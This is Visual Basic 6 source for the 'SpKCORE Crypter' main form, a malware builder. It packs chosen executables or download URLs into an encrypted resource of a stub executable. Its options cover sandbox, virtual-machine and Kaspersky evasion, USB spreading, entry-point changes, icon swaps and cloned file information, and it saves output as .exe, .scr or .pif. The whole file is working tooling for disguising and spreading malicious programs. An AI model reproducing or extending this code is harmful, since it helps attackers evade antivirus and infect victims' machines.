VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "SpKCORE Crypter"
   ClientHeight    =   10185
   ClientLeft      =   -15
   ClientTop       =   345
   ClientWidth     =   6465
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   10185
   ScaleWidth      =   6465
   ShowInTaskbar   =   0   'False
   StartUpPosition =   1  'CenterOwner
   Begin VB.CommandButton Command9 
      Caption         =   "About"
      Height          =   255
      Left            =   2640
      TabIndex        =   36
      Top             =   9840
      Width           =   1455
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Renew Session"
      Height          =   255
      Index           =   1
      Left            =   120
      TabIndex        =   35
      Top             =   9840
      Width           =   2415
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Exit"
      Height          =   255
      Left            =   4200
      TabIndex        =   34
      Top             =   9840
      Width           =   2175
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Crypt it!"
      Height          =   375
      Left            =   120
      TabIndex        =   30
      Top             =   9360
      Width           =   6255
   End
   Begin VB.HScrollBar scroll 
      Height          =   255
      Left            =   4200
      TabIndex        =   28
      Top             =   8880
      Width           =   375
   End
   Begin VB.Frame Frame8 
      Caption         =   "Encryption"
      Height          =   615
      Left            =   120
      TabIndex        =   25
      Top             =   8640
      Width           =   6255
      Begin VB.CommandButton cmd_generieren 
         Caption         =   "Generate Key"
         Height          =   255
         Left            =   4560
         TabIndex        =   29
         Top             =   240
         Width           =   1455
      End
      Begin VB.TextBox txtkeylaenge 
         Height          =   285
         Left            =   3480
         TabIndex        =   27
         Top             =   240
         Width           =   495
      End
      Begin VB.TextBox txtKey 
         Height          =   285
         Left            =   240
         TabIndex        =   26
         Top             =   240
         Width           =   3135
      End
   End
   Begin VB.Frame Frame7 
      Caption         =   "Anti Methods"
      Height          =   1095
      Left            =   3360
      TabIndex        =   21
      Top             =   7440
      Width           =   3015
      Begin VB.CheckBox Check4 
         Caption         =   "Anti VMWare / VirtualPC"
         Height          =   255
         Left            =   240
         TabIndex        =   24
         Top             =   240
         Width           =   2055
      End
      Begin VB.CheckBox Check5 
         Caption         =   "Anti Sandbox"
         Height          =   255
         Left            =   240
         TabIndex        =   23
         Top             =   480
         Width           =   2055
      End
      Begin VB.CheckBox Check6 
         Caption         =   "Anti Kaspersky"
         Height          =   255
         Left            =   240
         TabIndex        =   22
         Top             =   720
         Width           =   2175
      End
   End
   Begin VB.Frame Frame6 
      Caption         =   "Extra Options"
      Height          =   1095
      Left            =   120
      TabIndex        =   17
      Top             =   7440
      Width           =   3135
      Begin VB.CommandButton Command6 
         Caption         =   "?"
         Height          =   195
         Left            =   1560
         TabIndex        =   31
         Top             =   480
         Width           =   135
      End
      Begin VB.CheckBox Check14 
         Caption         =   "USB Spread"
         Height          =   255
         Left            =   240
         TabIndex        =   20
         Top             =   720
         Width           =   1575
      End
      Begin VB.CheckBox Check3 
         Caption         =   "EOF Support"
         Height          =   255
         Left            =   240
         TabIndex        =   19
         Top             =   480
         Width           =   1815
      End
      Begin VB.CheckBox Check1 
         Caption         =   "Change Entrypoint"
         Height          =   255
         Left            =   240
         TabIndex        =   18
         Top             =   240
         Width           =   2175
      End
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Browse..."
      Height          =   255
      Left            =   4680
      TabIndex        =   16
      Top             =   6840
      Width           =   1455
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   240
      TabIndex        =   15
      Top             =   6840
      Width           =   4335
   End
   Begin VB.CommandButton btnCloneBrowse 
      Caption         =   "Browse..."
      Height          =   255
      Left            =   4680
      TabIndex        =   12
      Top             =   5640
      Width           =   1455
   End
   Begin VB.ListBox List1 
      Columns         =   1
      Height          =   840
      ItemData        =   "Form1.frx":0000
      Left            =   240
      List            =   "Form1.frx":0002
      TabIndex        =   9
      Top             =   2280
      Width           =   4335
   End
   Begin VB.Frame Frame4 
      Caption         =   "Clone File Info:"
      Height          =   975
      Left            =   120
      TabIndex        =   8
      Top             =   5160
      Width           =   6255
      Begin VB.TextBox txtClone 
         Height          =   285
         Left            =   120
         TabIndex        =   11
         Top             =   480
         Width           =   4335
      End
      Begin VB.CheckBox chkClone 
         Caption         =   "Clone file information?"
         Height          =   195
         Left            =   120
         TabIndex        =   10
         Top             =   240
         Width           =   2175
      End
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Browse..."
      Height          =   255
      Left            =   4680
      TabIndex        =   7
      Top             =   4560
      Width           =   1455
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   240
      TabIndex        =   6
      Top             =   4560
      Width           =   4335
   End
   Begin VB.Frame Frame3 
      Caption         =   "Change Icon:"
      Height          =   975
      Left            =   120
      TabIndex        =   5
      Top             =   4080
      Width           =   6255
      Begin VB.CheckBox chkIcon 
         Caption         =   "Change icon?"
         Height          =   255
         Left            =   120
         TabIndex        =   32
         Top             =   240
         Width           =   2055
      End
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Add URL"
      Height          =   255
      Left            =   4680
      TabIndex        =   4
      Top             =   3600
      Width           =   1455
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   240
      TabIndex        =   3
      Top             =   3600
      Width           =   4335
   End
   Begin VB.Frame Frame2 
      Caption         =   "URL to download:"
      Height          =   615
      Left            =   120
      TabIndex        =   2
      Top             =   3360
      Width           =   6255
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Browse..."
      Height          =   375
      Left            =   4680
      TabIndex        =   1
      Top             =   2280
      Width           =   1575
   End
   Begin MSComDlg.CommonDialog dlgClone 
      Left            =   5880
      Top             =   240
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog DLG3 
      Left            =   5400
      Top             =   240
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cdl3 
      Left            =   5880
      Top             =   720
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog DLG2 
      Left            =   5400
      Top             =   720
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog DLG 
      Left            =   5640
      Top             =   1200
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      Caption         =   "Select files to crypt and URLs to download:"
      Height          =   1215
      Left            =   120
      TabIndex        =   0
      Top             =   2040
      Width           =   6255
      Begin VB.CommandButton Command7 
         Caption         =   "Clear List"
         Height          =   375
         Index           =   0
         Left            =   4560
         TabIndex        =   33
         Top             =   720
         Width           =   1575
      End
   End
   Begin VB.Frame Frame5 
      Caption         =   "Custom Stub"
      Height          =   1095
      Left            =   120
      TabIndex        =   13
      Top             =   6240
      Width           =   6255
      Begin VB.CheckBox Check2 
         Caption         =   "Use a custom stub? (Default: ew.exe)"
         Height          =   195
         Left            =   120
         TabIndex        =   14
         Top             =   360
         Value           =   2  'Grayed
         Width           =   3015
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Function BeginUpdateResource Lib "kernel32" Alias "BeginUpdateResourceA" (ByVal pFileName As String, ByVal bDeleteExistingResources As Long) As Long
Private Declare Function UpdateResource Lib "kernel32" Alias "UpdateResourceA" (ByVal hUpdate As Long, ByVal lpType As String, ByVal lpName As String, ByVal wLanguage As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function EndUpdateResource Lib "kernel32" Alias "EndUpdateResourceA" (ByVal hUpdate As Long, ByVal fDiscard As Long) As Long
Const FileSplit = "()/&@\]["

Dim eofdata As String
Dim Reg As Object
Private Declare Sub Sleep Lib "kernel32" (ByVal lngMilliseconds As Long)
Private Declare Function GetTickCount Lib "kernel32" () As Long
Const Letters1 = "abcdefghijklmnopqrstuvwxyz"
Const Letters2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const Letters3 = "{[]}\*/-+1234567890,.-;:_'*~#!§$%&/()=?"







Private Sub btnCloneBrowse_Click()

        dlgClone.DefaultExt = ".exe"
        dlgClone.DialogTitle = "Open PE File"
        dlgClone.Filter = "Executables (*.exe)|*.exe"
        dlgClone.ShowOpen
        
        txtClone.Text = dlgClone.FileName
        
        

End Sub

Private Sub Check2_Click()
If Check2.Value = 1 Then
Text3.Enabled = True
Command5.Enabled = True
Else
Text3.Enabled = False
Command5.Enabled = False
End If

End Sub



Private Sub chkClone_Click()
If txtClone.Enabled = False Then
txtClone.Enabled = True
btnCloneBrowse.Enabled = True
Else
txtClone.Enabled = False
btnCloneBrowse.Enabled = False
End If
End Sub

Private Sub chkIcon_Click()
If Text2.Enabled = False Then
Text2.Enabled = True
Command4.Enabled = True
Else
Text2.Enabled = False
Command4.Enabled = False
End If
End Sub

Private Sub cmd_generieren_Click()

Dim zeichen As String
Dim i As Integer
zeichen = ""
zeichen = Letters1 & Letters2 & Letters3



If Not IsNumeric(txtkeylaenge.Text) Then
    MsgBox "Pick a number of character to generate.", vbCritical, "Error"
    Exit Sub
End If

Dim stringiling As String
stringiling = ""

txtKey.Text = ""

If txtkeylaenge.Text >= 27 Then
MsgBox "Pick a number less than 26"
Else
For i = 1 To txtkeylaenge.Text
    Randomize Timer
    Dim start As String
    start = Int((Rnd * Len(zeichen)) + 1)
    stringiling = stringiling & Mid(zeichen, start, 1)
    DoEvents
Next i
End If

txtKey.Text = stringiling

End Sub

Private Sub Command1_Click()
On Error Resume Next
        DLG.CancelError = True
        DLG.DefaultExt = ".exe"
        DLG.DialogTitle = "Open PE File"
        DLG.Filter = "Executables (*.exe)|*.exe"
        DLG.ShowOpen
        
        List1.AddItem (DLG.FileName)
End Sub






Private Sub Command2_Click()
        
        
If List1.ListCount = 0 Then
MsgBox "Please choose a file!", vbInformation, "Info"
Exit Sub
End If
        
        Dim sBuff As String
        Dim sStub As String
        Dim hRes As Long
        Dim c As New Class1
        Dim sTotal As String
        Dim i As Integer
        Dim Err As String
        Dim Stubpath As String
        
        
        With DLG
        On Error Resume Next

        .CancelError = True
        .DefaultExt = ".exe"
       .Filter = "Exe Files (*.exe)|*.exe|Scr Files (*.scr)|*.scr|Com Files (*.com)|*.com|Bat Files (*.bat)|*.bat|Pif Files (*.pif)|*.pif|"
        .FileName = "SpKCORE.exe"
        .ShowSave
        End With
        
        
        
        
        If Check2.Value = 1 Then
        Stubpath = cdl3.FileName
        Else
        Stubpath = App.Path & "\ew.exe"
        End If
        
        
        Open Stubpath For Binary As #1
        sStub = Space(LOF(1))
        Get #1, , sStub
        Close #1
        
        
        
        
        For i = 0 To List1.ListCount - 1
        
        If Left(List1.List(i), 4) <> "http" Then
            Open List1.List(i) For Binary As #1
            sBuff = Space(LOF(1))
            Get #1, , sBuff
            Close #1
        Else
        sBuff = List1.List(i)
        End If
        
        Open DLG.FileName For Binary As #1
        Put #1, , sStub & FileSplit
        'Put #1, ,
        'put #1, ,
        'put #1, ,
        'put #1, ,

        
        Close #1
        
        sTotal = sTotal & sBuff & FileSplit
        Next i
                        
                        
                        
        
              Call RealignPEFromFile(DLG.FileName)

        sTotal = c.EncryptString(sTotal, "passwordhere")
        hRes = BeginUpdateResource(DLG.FileName, False) 'here we start by telling the output file that were updating his resources and not to delete the resources it may already have
        Call UpdateResource(hRes, "53738", 500, 0, ByVal sTotal, Len(sTotal)) 'the actual updating of the resources. it adds the sFile string as resource CUSTOM 101 to the output file.
        Call EndUpdateResource(hRes, False) 'end the updating of the resource
        

        




      '''''' Extras go here
     
       If Text2.Enabled = True Then
       
       ChangeIcon DLG.FileName, Text2.Text
       
       
       End If
       
       
       If txtClone.Enabled = True Then
        
    CloneFile DLG.FileName, txtClone.Text
     
       End If
       
       
       If Check1.Value = Checked Then
       Call ChangeOEPFromFile(DLG.FileName)
       End If
       
       If Check3.Value = Checked Then
        pathEOF (DLG.FileName)
       End If
       
       
               If Check14.Value = Checked Then
        INFECT_USB App.Path, App.EXEName & ".exe"
        End If
        
    
        
        



       ''''''''
       
       
       
 MsgBox "Successfully crypted!" & vbNewLine & vbNewLine _
 & "- SpKCORE"
 
 
End Sub

Private Sub Command3_Click()
List1.AddItem (Text1)
Text1.Text = ""

End Sub

Private Sub Command4_Click()

        With DLG2
        .CancelError = False
        .DefaultExt = ".ico"
        .Filter = "ICO Files (*.ico)|*.ico"
        .ShowOpen
        
        End With
        Text2.Text = DLG2.FileName

End Sub



Private Sub Command5_Click()
cdl3.CancelError = False
cdl3.DialogTitle = "Open Custom Stub"
cdl3.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
cdl3.ShowOpen
Text3.Text = cdl3.FileName


End Sub




Private Sub File1_Click()

End Sub






Private Sub Command6_Click()
MsgBox "Due to some bugs, only the last file in the listview can support EOF."
End Sub


Private Sub Command7_Click(index As Integer)
List1.Clear

txtkeylaenge.Text = 16

Dim zeichen As String
Dim i As Integer
zeichen = ""
zeichen = Letters1 & Letters2 & Letters3


Dim stringiling As String
stringiling = ""

txtKey.Text = ""

If txtkeylaenge.Text >= 27 Then
MsgBox "Pick a number less than 26"
Else
For i = 1 To txtkeylaenge.Text
    Randomize Timer
    Dim start As String
    start = Int((Rnd * Len(zeichen)) + 1)
    stringiling = stringiling & Mid(zeichen, start, 1)
    DoEvents
Next i
End If

txtKey.Text = stringiling
End Sub

Private Sub Command8_Click()
End
Unload Me
End Sub

Private Sub Command9_Click()
frmAbout.Show

End Sub

Private Sub Form_Initialize()
Me.Caption = "SpKCORE Crypter       |       Private Version for:" & " " & frmLogin.Text1.Text

txtkeylaenge.Text = 16

Dim zeichen As String
Dim i As Integer
zeichen = ""
zeichen = Letters1 & Letters2 & Letters3


Dim stringiling As String
stringiling = ""

txtKey.Text = ""

If txtkeylaenge.Text >= 27 Then
MsgBox "Pick a number less than 26"
Else
For i = 1 To txtkeylaenge.Text
    Randomize Timer
    Dim start As String
    start = Int((Rnd * Len(zeichen)) + 1)
    stringiling = stringiling & Mid(zeichen, start, 1)
    DoEvents
Next i
End If

txtKey.Text = stringiling


   Check2.Value = 0
   
   If chkClone.Value = Unchecked Then
txtClone.Enabled = False
btnCloneBrowse.Enabled = False
Text2.Enabled = False
Command4.Enabled = False
Else
txtClone.Enabled = True
btnCloneBrowse.Enabled = True
Text2.Enabled = True
Command4.Enabled = True
   
   End If
End Sub



Private Sub scroll_Change()
txtkeylaenge.Text = CStr(Scroll.Value)
If txtkeylaenge.Text = 27 Then Scroll.Value = 1

End Sub

